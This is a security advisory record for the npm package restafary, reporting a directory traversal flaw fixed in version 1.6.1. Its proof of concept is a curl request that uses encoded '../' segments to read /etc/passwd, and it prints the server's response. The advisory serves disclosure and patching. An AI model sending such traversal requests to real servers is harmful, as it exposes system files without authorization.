---
Publication-State: Active
Access: Public
Reviewers:
- Name: Craig Arendt
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/restafary
Review-Date: '2016-03-28'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Directory Traversal*<br><br>Recommendation: Upgrade to restafary version 1.6.1 or greater.
### Details
- restafary is a REpresentful State Transfer API for Creating, Reading, Using, Deleting files on a server from the web - restafary is able to set up a root path, which should only allow it to run inside of that root path it specified.  - An attacker is able to provide a specifically crafted path to access files outside of this specified root path.     - Note: this is only possible if the attacker has access to the restafary application.  Proof of Concept  ``` curl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'   HTTP/1.1 200 OK X-Powered-By: Express Access-Control-Allow-Origin: * Content-Type: text/plain; charset=UTF-8 Vary: Accept-Encoding Accept-Ranges: bytes Last-Modified: Sun Jul 12 2015 22:38:08 GMT-0700 (PDT) Content-Length: 5581 Cache-Control: max-age=0 Date: Fri, 25 Mar 2016 17:30:29 GMT Connection: keep-alive  ## # User Database #  # Note that this file is consulted directly only when the system is running # in single-user mode.  At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh ```
<br><br>• Affected Versions: <1.6.1
<br>• Patched Versions: >=1.6.1
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
None
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
